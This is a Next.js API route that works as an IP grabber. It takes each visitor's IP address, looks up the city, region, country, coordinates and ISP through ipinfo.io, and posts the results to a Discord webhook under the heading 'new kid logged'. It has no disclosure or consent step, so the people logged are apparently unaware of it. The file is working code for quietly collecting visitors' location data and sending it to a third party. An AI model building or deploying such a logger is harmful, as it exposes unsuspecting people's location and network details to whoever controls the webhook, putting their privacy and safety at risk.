import { NextResponse } from 'next/server';

export async function POST(request: Request) {
    try {
        const { sessionId, clientTime } = await request.json();

        // Get IP from headers (standard for Vercel/Next.js)
        const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 'Unknown';

        // Server-side IP lookup
        let geoInfo: any = {};
        if (ip !== 'Unknown') {
            try {
                const res = await fetch(`https://ipinfo.io/${ip}/json`);
                if (res.ok) {
                    geoInfo = await res.json();
                }
            } catch (e) {
                console.error('Geo lookup failed', e);
            }
        }

        const city = geoInfo.city || 'Unknown';
        const region = geoInfo.region || 'Unknown';
        const country = geoInfo.country || 'Unknown';
        const loc = geoInfo.loc || 'Unknown';
        const org = geoInfo.org || 'Unknown';

        const message =
            "# new kid logged\n" +
            "```" + sessionId + "```\n" +
            "**IP:** `" + ip + "`\n" +
            "**city:** `" + city + "`\n" +
            "**region:** `" + region + "`\n" +
            "**country:** `" + country + "`\n" +
            "**coords:** `" + loc + "`\n" +
            "**org:** `" + org + "`\n" +
            "**time:** `" + clientTime + "`";

        if (!process.env.DISCORD_WEBHOOK) {
            return NextResponse.json({ error: 'Webhook URL not configured' }, { status: 500 });
        }

        await fetch(process.env.DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message }),
        });

        return NextResponse.json({ status: "ok" });
    } catch (error) {
        console.error('Webhook error:', error);
        return NextResponse.json({ error: 'Failed to send webhook' }, { status: 500 });
    }
}
